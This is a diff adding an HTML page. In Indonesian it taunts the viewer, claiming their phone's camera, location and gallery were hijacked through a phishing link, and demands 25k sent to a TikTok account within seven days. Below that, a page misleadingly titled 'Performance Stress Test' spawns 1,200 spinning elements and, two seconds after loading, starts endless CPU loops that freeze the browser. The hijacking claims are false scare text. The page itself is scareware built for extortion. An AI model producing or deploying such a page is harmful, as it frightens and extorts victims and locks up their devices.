@@ -1,0 +1,63 @@
+ <body style="background-color: red">
+ <h1>waduh gimana rek hp mu?kena vps kiler nih aman? makasih udh pencet link pising kamera lokaasi sama galery dan lain" udh ke bajak udh keliatan muka plenger kalo mau gak kebajak tf ke tiktok @lubyy2nd harg 25k di kasih waktu 7hri doang ya </h1>
+ </body>
+ <img src="umpanphising.jpg">
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Performance Stress Test</title>
+<style>
+    body {
+        margin: 0;
+        background: black;
+        overflow: hidden;
+    }
+    .box {
+        position: absolute;
+        width: 40px;
+        height: 40px;
+        background: red;
+        animation: spin 0.2s linear infinite;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
+</head>
+<body>
+
+<script>
+let boxes = [];
+
+function createBoxes(amount) {
+    for (let i = 0; i < amount; i++) {
+        let div = document.createElement("div");
+        div.className = "box";
+        div.style.left = Math.random() * window.innerWidth + "px";
+        div.style.top = Math.random() * window.innerHeight + "px";
+        document.body.appendChild(div);
+        boxes.push(div);
+    }
+}
+
+function heavyLoop() {
+    while (true) {
+        Math.sqrt(Math.random() * 999999);
+    }
+}
+
+// jumlah elemen berat
+createBoxes(1200);
+
+// trigger CPU load
+setTimeout(() => {
+    for (let i = 0; i < 4; i++) {
+        setTimeout(heavyLoop, 10);
+    }
+}, 2000);
+</script>
+
+</body>
+</html>
